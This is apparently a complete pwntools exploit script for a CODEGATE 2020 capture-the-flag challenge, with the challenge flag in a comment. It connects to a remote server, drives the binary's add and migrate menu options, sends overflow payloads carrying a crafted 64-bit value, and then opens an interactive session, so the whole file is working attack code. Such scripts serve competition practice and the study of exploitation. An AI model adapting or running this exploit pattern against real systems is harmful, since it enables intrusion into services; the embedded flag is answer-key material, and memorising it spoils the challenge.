#!/usr/bin/env python
# coding: utf-8

from pwn import *

# CODEGATE2020{ROP@One_Register_Machine:):)}

p = remote('110.10.147.39', 31337)

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)

def add(name, desc):
	ru('>>> ')
	sel('A')
	ru('8): ')
	se(name)
	ru('128): ')
	se(desc)

def migrate(idx, desc):
	ru('>>> ')
	sel('M')
	ru('index: ')
	sel(str(idx))
	ru('128): ')
	se(desc)

for i in range(8):
	add('A'*7, 'B'*0x70 + 'CCCCCCCC' + p64(0x80808080808084B6))

migrate(0, 'BBBBBBBB')
p.interactive()
